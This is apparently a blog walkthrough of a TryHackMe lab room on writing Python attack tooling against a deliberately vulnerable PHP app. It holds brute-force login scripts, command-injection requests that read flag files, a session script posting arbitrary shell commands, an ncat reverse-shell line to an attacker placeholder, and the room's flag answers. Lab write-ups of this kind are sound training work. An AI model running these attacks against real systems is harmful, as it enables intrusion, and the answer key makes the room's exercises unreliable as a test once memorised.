---
title: "TryHackMe Custom Tooling Using Python: brute-force to RCE"
date: 2026-10-27T21:50:00+05:30
lastmod: 2026-10-27T21:50:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-customtooling/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Python
  - brute-force
  - vulnerability scanner
  - RCE
  - command injection
  - task automation
  - Custom Tooling
  - Web Application Red Teaming

draft: false
description: "TryHackMe Custom Tooling Using Python walkthrough: brute-force login, vulnerability scanning, RCE exploit, and task automation with Python requests."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Custom Tooling Using Python |![Custom Tooling Using Python room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1743656880330)|

This easy-difficulty room in the Custom Tooling module of the Web Application Red Teaming path walks through building four categories of Python tooling against a deliberately vulnerable PHP application: a brute-force login script, a vulnerability scanner, a command injection exploit, and a multi-stage task automation script combining authentication with post-exploitation. The room sits alongside [CAPTCHApocalypse](/post/thm-room-captchapocalypse/) in the same module, and the next room in the path is Custom Tooling using Burp.

## Task 1: Introduction

Setup task. The room deploys a single VM running a PHP application accessible at `python.thm` on the lab IP. Four labs sit under `/labs/lab1` through `/labs/lab4`, one per tooling category. Since the Mac's THM VPN routes to the lab IP directly, all exercises run from the local terminal with a `Host: python.thm` header on each request.

### Answers

- **I am ready to use code to create custom tooling and exploits!** No answer needed.

## Task 2: Choosing a language for custom tooling

The task compares scripting languages (Python, JavaScript, Ruby) with compiled languages (Go, C, Rust) for red team tooling. Scripting languages are easier to prototype and modify on the fly but run slower than compiled binaries. The tradeoff matters when tooling needs to run on a target with limited resources or when speed-sensitive operations (brute-force, scanning) dominate the runtime.

Python is the room's choice because of its `requests` library for HTTP interaction, `BeautifulSoup` for parsing, and broad ecosystem of offensive security tools (Impacket, pwntools, Scapy). Go is highlighted for cross-compilation: a single `GOOS=windows GOARCH=amd64 go build` produces a Windows binary from a Linux or macOS host. JavaScript is noted as the best fit for web-based exploits because it runs natively in the browser and can manipulate DOM elements, cookies, and client-side crypto directly.

### Answers

- **Does a scripting language perform better than a compiled language? (Yea/Nay)** **Nay**
- **Which compiled language is easy to cross-compile?** **Go**
- **Which scripting language is best suited for web-based exploits?** **JavaScript**

## Task 3: Building a brute-force tool

### The login endpoint

Lab 1 at `/labs/lab1/index.php` presents a username/password form. The task provides a starter script using `requests.post()` with a wordlist of passwords and a known username (`admin`). The script checks whether the response contains "Invalid" to detect failures.

### Brute-forcing admin

The admin password is a 4-digit number. The task hints at starting from 1200, so the search space is small:

```python
  import requests

  url = "http://MACHINE_IP/labs/lab1/index.php"
  for i in range(1200, 1300):
      password = str(i).zfill(4)
      data = {"username": "admin", "password": password}
      response = requests.post(url, data=data, headers={"Host": "python.thm"})
      if "Invalid" not in response.text:
          print(f"[+] Found: admin:{password}")
          break
  #  [+] Found: admin:1234
```

Password `1234` grants access and the response contains the flag.

{{< ad >}}

### Brute-forcing Mark

The second credential target is user `mark`, whose password follows the pattern `\d{3}[A-Z]` with the hint "Triple ones...". That narrows the search to 26 candidates: `111A` through `111Z`.

```python
  import requests, string

  url = "http://MACHINE_IP/labs/lab1/index.php"
  for letter in string.ascii_uppercase:
      password = f"111{letter}"
      data = {"username": "mark", "password": password}
      response = requests.post(url, data=data, headers={"Host": "python.thm"})
      if "Invalid" not in response.text:
          print(f"[+] Found: mark:{password}")
          break
  #  [+] Found: mark:111A
```

### Answers

- **What is one of the renowned Python libraries used to send HTTP requests?** **requests**
- **What is the flag value after logging in as admin?** **THM{Brute_Force_Success007}**
- **Can you attempt to log in as Mark?** **THM{Brute_Force_Success_Mark001}**

## Task 4: Building a vulnerability scanner

### The scanner script

The task provides a Python vulnerability scanner that sends a list of SQL injection and XSS payloads to a target URL via GET requests, then checks the response for indicators of successful injection (reflected input for XSS, SQL error messages for SQLi).

The first question tests whether you notice that the scanner as written targets `greetings.php?id=` but the question asks about `departments.php?name=`. When you change only the URL (to `departments.php?name=`) but leave the parameter name as `id` in the `params` dict, the payloads go into the wrong parameter. The server receives `departments.php?name=&id=<payload>`, the `name` parameter is empty, and no vulnerabilities are found.

### Fixing the parameter

Changing the `params` key from `id` to `name` sends the payloads into the correct GET parameter. With this fix, the scanner finds **2** payloads that trigger SQL injection indicators: a single quote (`'`) and a UNION SELECT statement.

The vulnerability type is SQL injection (option **b**), not XSS, because the `departments.php` endpoint processes the `name` parameter in a SQL query and reflects database errors.

### Concurrent scanning

The task mentions the `threading` library for making concurrent requests to speed up scanning. Python's `threading` module is the standard library approach for I/O-bound concurrency: each thread sends an HTTP request in parallel, and the GIL does not bottleneck network I/O.

### Answers

- **How many vulnerabilities will be identified if we use the scanner with the updated URL but without changing the original code?** **0**
- **After tweaking the script to use the appropriate GET parameter, how many payloads are found?** **2**
- **Which is the valid type of vulnerability? Write the correct option only.** **b**
- **What is the name of the renowned library used to make concurrent requests?** **threading**

## Task 5: Creating a basic exploit

### RCE via command injection

Lab 3 exposes an endpoint at `/labs/lab3/execute.php?cmd=<command>` that passes the `cmd` parameter directly to a shell. The task walks through building a Python script that sends a GET request to this endpoint with an arbitrary command and reads the output.

Testing with `whoami` confirms execution as `www-data`:

```
  curl "http://MACHINE_IP/labs/lab3/execute.php?cmd=whoami" -H "Host: python.thm"
  www-data
```

Finding and reading the flag:

```
  curl "http://MACHINE_IP/labs/lab3/execute.php?cmd=cat+/var/www/html/labs/lab3/flag.txt" \
    -H "Host: python.thm"
  THM{REDACTED}
```

The task also demonstrates enhancing the script into an interactive shell (a `while True` loop reading user input and sending each command) and automating a reverse shell by sending an `ncat ATTACKBOX_IP 4444 -e /bin/bash` payload. For this room, the flag is accessible without a reverse shell since the web user has read access to `flag.txt`.

### Answers

- **What is the flag value?** **THM{basic_exploit_using_python}**

## Task 6: Task automation

### Combining authentication with post-exploitation

Lab 4 sits behind a login form at `/labs/lab4/login.php`. The credentials are `admin:password123` (provided in the task). After authentication, a dashboard at `/labs/lab4/dashboard.php` presents a command execution form with a `<select>` dropdown limited to `top` and `date`.

The key insight: the server-side code (`dashboard.php`) calls `shell_exec($cmd)` on whatever value arrives in the POST body, without validating it against the dropdown options. The `<select>` is a client-side restriction only. A Python script using `requests.Session()` can authenticate, maintain the session cookie, and POST arbitrary commands:

```python
  import requests

  LOGIN_URL = "http://MACHINE_IP/labs/lab4/login.php"
  EXEC_URL = "http://MACHINE_IP/labs/lab4/dashboard.php"

  session = requests.Session()
  session.headers.update({"Host": "python.thm"})

  session.post(LOGIN_URL, data={"username": "admin", "password": "password123"})

  resp = session.post(EXEC_URL, data={"cmd": "ls -la"})
  #  6470e394cbf6dab6a91682cc8585059b.txt
  #  dashboard.php  index.php  login.php  logout.php

  resp = session.post(EXEC_URL, data={"cmd": "cat 6470e394cbf6dab6a91682cc8585059b.txt"})
  #  THM{REDACTED}
```

The flag file is named after its own MD5 hash, a pattern that prevents guessing the filename without first listing the directory.

### Answers

- **What is the flag?** **THM{6470e394cbf6dab6a91682cc8585059b}**

## Task 7: Conclusion

The room concludes with a reminder that custom tooling is a core red team skill. Off-the-shelf tools cover common cases, but engagements regularly surface application-specific logic (custom authentication schemes, non-standard parameter handling, client-side encryption) that requires purpose-built scripts. Python's `requests` library, combined with `threading` for concurrency and `BeautifulSoup` for HTML parsing, covers most web application tooling needs.

### Answers

- **I understand the importance of using code to develop custom tooling.** No answer needed.

## Takeaways

**A server-side input validation gap that is invisible in the browser is trivially exploitable with a Python script.** The dashboard in Task 6 restricts command execution to two predefined options via a `<select>` element, which looks secure in the browser. But `<select>` is a UI constraint, not a security control: the server accepts any value in the `cmd` POST parameter and passes it to `shell_exec()` without checking it against an allowlist. The fix is server-side validation: compare the submitted value against the set of permitted commands before executing it. Client-side controls (dropdowns, disabled fields, JavaScript validation) are conveniences for legitimate users, never barriers for attackers.

**Changing a URL without changing the parameter name is a silent failure that looks like a clean scan.** The vulnerability scanner in Task 4 found zero results not because the target was secure, but because the payloads were sent to `?id=` while the application reads `?name=`. The server ignored the unknown parameter entirely, so every request returned a clean response. This is a common real-world mistake when adapting tools between targets: the HTTP request succeeds (200 OK, no errors), the scanner runs to completion, and the operator concludes "no vulnerabilities found." Always verify that the tool is actually testing the input the application processes, not a parameter the application discards.

Room solved 100%: 7 tasks, 12 answers.
